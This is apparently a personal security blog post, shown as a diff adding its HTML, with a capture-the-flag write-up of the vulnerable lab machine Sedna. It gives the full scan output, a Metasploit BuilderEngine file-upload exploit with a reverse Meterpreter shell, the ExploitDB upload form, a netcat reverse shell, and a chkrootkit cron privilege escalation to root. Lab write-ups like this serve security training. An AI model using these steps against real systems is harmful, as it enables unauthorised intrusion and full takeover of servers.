@@ -1,0 +1,807 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hackfest 2016: Sedna - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Sedna writeup">
+  <meta name="keywords" content="sedna, pentest lab, vulnhub, ctf, boot2root, hackfest sedna, hackfest 2016 sedna">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Hackfest 2016: Sedna</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-11-16T14:22:02-05:00" pubdate data-updated="true">Nov 16<span>th</span>, 2018</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This is another machine in the Hackfest 2016 series.</p>
+
+<blockquote><p>There are 4 flags on this machine One for a shell One for root access Two for doing post
+exploitation on Sedna</p></blockquote>
+
+<p>Alrighty, let&rsquo;s hack the planet!</p>
+
+<!-- more -->
+
+
+<p>Plenty of open ports:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
+</span><span class='line'>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
+</span><span class='line'>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
+</span><span class='line'>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
+</span><span class='line'>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
+</span><span class='line'>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+</span><span class='line'>| dns-nsid: 
+</span><span class='line'>|_  bind.version: 9.9.5-3-Ubuntu
+</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+</span><span class='line'>| http-robots.txt: 1 disallowed entry 
+</span><span class='line'>|_Hackers
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
+</span><span class='line'>110/tcp   open  pop3        Dovecot pop3d
+</span><span class='line'>|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>|   100024  1          48644/tcp  status
+</span><span class='line'>|_  100024  1          58324/udp  status
+</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span><span class='line'>143/tcp   open  imap        Dovecot imapd (Ubuntu)
+</span><span class='line'>|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+</span><span class='line'>993/tcp   open  ssl/imaps?
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>995/tcp   open  ssl/pop3s?
+</span><span class='line'>|_ssl-date: TLS randomness does not represent time
+</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+</span><span class='line'>| http-methods: 
+</span><span class='line'>|_  Potentially risky methods: PUT DELETE
+</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
+</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
+</span><span class='line'>|_http-title: Apache Tomcat
+</span><span class='line'>48644/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn&rsquo;t lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.145.128/
+</span><span class='line'>
+</span><span class='line'>=====================================================
+</span><span class='line'>2018/11/16 14:56:38 Starting gobuster
+</span><span class='line'>=====================================================
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/blocks (Status: 301)
+</span><span class='line'>/files (Status: 301)
+</span><span class='line'>/modules (Status: 301)
+</span><span class='line'>/robots.txt (Status: 200)
+</span><span class='line'>/server-status (Status: 403)
+</span><span class='line'>/system (Status: 301)
+</span><span class='line'>/themes (Status: 301)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside <a href="http://192.168.145.128/themes/default_theme_2016/description.txt">http://192.168.145.128/themes/default_theme_2016/description.txt</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Default Theme 2016 for BuilderEngine V3.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let&rsquo;s see both in action, starting with Metasploit!</p>
+
+<h2>Low privilege shell &ndash; Metasploit</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>search builderengine
+</span><span class='line'>
+</span><span class='line'>Matching Modules
+</span><span class='line'>================
+</span><span class='line'>
+</span><span class='line'>   Name                                          Disclosure Date  Rank       Check  Description
+</span><span class='line'>   ----                                          ---------------  ----       -----  -----------
+</span><span class='line'>   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
+</span><span class='line'>
+</span><span class='line'>Name       Current Setting  Required  Description
+</span><span class='line'>   ----       ---------------  --------  -----------
+</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class='line'>   RHOST      192.168.145.128  yes       The target address
+</span><span class='line'>   RPORT      80               yes       The target port (TCP)
+</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span><span class='line'>   TARGETURI  /                yes       The base path to BuilderEngine
+</span><span class='line'>   VHOST                       no        HTTP server virtual host
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Payload options (php/meterpreter_reverse_tcp):
+</span><span class='line'>
+</span><span class='line'>   Name   Current Setting  Required  Description
+</span><span class='line'>   ----   ---------------  --------  -----------
+</span><span class='line'>   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
+</span><span class='line'>   LPORT  8000             yes       The listen port</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ran it and got a Meterpreter shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(multi/http/builderengine_upload_exec) &gt; run
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse TCP handler on 192.168.145.133:8000 
+</span><span class='line'>[+] Our payload is at: ppWvWjKRuV.php. Calling payload...
+</span><span class='line'>[*] Calling payload...
+</span><span class='line'>[*] Meterpreter session 1 opened (192.168.145.133:8000 -&gt; 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
+</span><span class='line'>[+] Deleted ppWvWjKRuV.php
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>The kernel is old, so plenty of privilege escalations should be available:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
+</span><span class='line'>Computer    : Sedna
+</span><span class='line'>OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
+</span><span class='line'>Meterpreter : php/linux
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt; cat /etc/lsb-release
+</span><span class='line'>DISTRIB_ID=Ubuntu
+</span><span class='line'>DISTRIB_RELEASE=14.04
+</span><span class='line'>DISTRIB_CODENAME=trusty
+</span><span class='line'>DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used Searchsploit to look for Ubuntu 14.04 exploits and went with the <a href="https://www.exploit-db.com/exploits/37292/">37292.c overlayfs exploit</a>/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; cat /var/www/flag.txt
+</span><span class='line'>bfbb7e6e6e88d9ae66848b9aeac6b289</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Before continuing with rooting the machine, I went back getting a shell without Metasploit.</p>
+
+<h2>Low privilege shell &ndash; manual</h2>
+
+<p>Here&rsquo;s the ExploitDB variant of arbitrary file upload:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat 40390.php 
+</span><span class='line'>&lt;!-- 
+</span><span class='line'># Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
+</span><span class='line'># Date: 18/09/2016
+</span><span class='line'># Exploit Author: metanubix
+</span><span class='line'># Vendor Homepage: http://builderengine.org/
+</span><span class='line'># Software Link: http://builderengine.org/page-cms-download.html
+</span><span class='line'># Version: 3.5.0
+</span><span class='line'># Tested on: Kali Linux 2.0 64 bit
+</span><span class='line'># Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"
+</span><span class='line'>
+</span><span class='line'>1) Unauthenticated Unrestricted File Upload:
+</span><span class='line'>
+</span><span class='line'>  POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/
+</span><span class='line'>
+</span><span class='line'>  Vulnerable Parameter: files[]
+</span><span class='line'>
+</span><span class='line'>  We can upload test.php and reach the file via the following link:
+</span><span class='line'>  /files/test.php
+</span><span class='line'>--&gt;
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;
+</span><span class='line'>  &lt;input type="file" name="files[]" /&gt;
+</span><span class='line'>  &lt;input type="submit" value="send" /&gt;
+</span><span class='line'>&lt;/form&gt;
+</span><span class='line'>&lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:</p>
+
+<p><img class="center" src="/images/pentest/sedna/form.jpg" title="upload" alt="upload form"></p>
+
+<p>Then I went to <a href="http://192.168.145.128/files/shell.php">http://192.168.145.128/files/shell.php</a> and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in <em>/etc/passwd</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>crackmeforpoints:x:1000:1000::/home/crackmeforpoints:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cracking the password for this user might be another flag, but first I need root. Since the exploits I&rsquo;ve tried so far didn&rsquo;t work, I decided to go down the <a href="https://www.exploit-db.com/exploits/40839/">dirtycow</a> route. Unfortunately, that didn&rsquo;t work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail.</p>
+
+<h2>Getting root</h2>
+
+<p>The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed <em>chkrootkit</em> was present. I searched for available exploits and found a privilege escalation one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>searchsploit chkrootkit
+</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
+</span><span class='line'> Exploit Title                                                                   |  Path
+</span><span class='line'>                                                                                 | (/usr/share/exploitdb/)
+</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
+</span><span class='line'>Chkrootkit - Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
+</span><span class='line'>Chkrootkit 0.49 - Local Privilege Escalation                                     | exploits/linux/local/33899.txt
+</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
+</span><span class='line'>Shellcodes: No Result</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The exploit is available for version 0.49, so let&rsquo;s see what version is on the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
+</span><span class='line'>./chkrootkit -V
+</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called <em>update</em> with content of your choice in /tmp and wait for chkrootkit to run it as root.</p>
+
+<p>Metasploit came through and finally, I got root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(unix/local/chkrootkit) &gt; options
+</span><span class='line'>
+</span><span class='line'>Module options (exploit/unix/local/chkrootkit):
+</span><span class='line'>
+</span><span class='line'>   Name        Current Setting       Required  Description
+</span><span class='line'>   ----        ---------------       --------  -----------
+</span><span class='line'>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
+</span><span class='line'>   SESSION                           yes       The session to run this module on.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Exploit target:
+</span><span class='line'>
+</span><span class='line'>   Id  Name
+</span><span class='line'>   --  ----
+</span><span class='line'>   0   Automatic
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; set SESSION 1
+</span><span class='line'>SESSION =&gt; 1
+</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; run
+</span><span class='line'>
+</span><span class='line'>[!] SESSION may not be compatible with this module.
+</span><span class='line'>[*] Started reverse TCP double handler on 192.168.145.133:4444 
+</span><span class='line'>[!] Rooting depends on the crontab (this could take a while)
+</span><span class='line'>[*] Payload written to /tmp/update
+</span><span class='line'>[*] Waiting for chkrootkit to run via cron...
+</span><span class='line'>[*] Accepted the first client connection...
+</span><span class='line'>[*] Accepted the second client connection...
+</span><span class='line'>[*] Command: echo EzISATvm3xKkw6bX;
+</span><span class='line'>[*] Writing to socket A
+</span><span class='line'>[*] Writing to socket B
+</span><span class='line'>[*] Reading from sockets...
+</span><span class='line'>[*] Reading from socket B
+</span><span class='line'>[*] B: "EzISATvm3xKkw6bX\r\n"
+</span><span class='line'>[*] Matching...
+</span><span class='line'>[*] A is input...
+</span><span class='line'>[*] Command shell session 2 opened (192.168.145.133:4444 -&gt; 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
+</span><span class='line'>[+] Deleted /tmp/update
+</span><span class='line'>whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Got the root flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /root/flag.txt
+</span><span class='line'>a10828bee17db751de4b936614558305</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I didn&rsquo;t want to crack the password for the 4th flag, so I decided to call it a day at &frac34; flags.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
+</span><span class='line'>/ I must have a prodigious quantity of  \
+</span><span class='line'>| mind; it takes me as much as a week   |
+</span><span class='line'>| sometimes to make it up.              |
+</span><span class='line'>|                                       |
+</span><span class='line'>\ -- Mark Twain, "The Innocents Abroad" /
+</span><span class='line'> ---------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-11-16T14:22:02-05:00" pubdate data-updated="true">Nov 16<span>th</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/11/11/social-engineering-expert-course-review/" title="Previous Post: Social Engineering Expert course review">&laquo; Social Engineering Expert course review</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
